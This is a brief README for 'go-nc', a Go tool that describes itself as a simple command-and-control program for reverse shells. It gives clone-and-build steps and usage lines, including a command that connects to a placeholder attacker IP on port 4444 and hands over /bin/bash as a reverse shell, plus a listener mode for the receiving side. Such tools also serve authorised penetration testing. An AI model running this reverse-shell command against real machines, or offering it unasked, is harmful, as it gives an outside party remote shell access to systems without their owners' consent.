# go-nc
Simple Command & Control for revshells in pure Go

# Build
```bash
git clone https://github.com/vay3t/go-nc
cd go-nc
go build .
```

# Usage

### Reverse shell
```bash
./go-nc -host <IP ATTACKER> -port 4444 -exec /bin/bash
```

### Server
```bash
./go-nc -listen
```